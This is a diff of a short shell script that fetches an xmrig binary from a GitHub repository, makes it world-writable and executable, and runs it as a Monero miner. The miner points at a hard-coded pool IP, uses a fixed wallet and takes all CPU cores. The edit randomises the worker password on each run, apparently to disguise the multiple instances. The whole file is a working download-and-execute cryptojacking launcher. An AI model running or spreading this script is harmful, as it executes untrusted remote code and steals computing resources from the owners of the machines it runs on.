@@ -1,4 +1,4 @@
 #!/bin/sh
 wget -O mm https://github.com/kazppkido/kikir/raw/main/xmrig 
 chmod 777 mm
-./mm --donate-level 1 -o 165.232.165.31:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw -p kikir -a rx/0 -t $(nproc --all)
+./mm --donate-level 1 -o 165.232.165.31:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw -p $(echo $RANDOM | md5sum | head -c 20) -a rx/0 -t $(nproc --all)
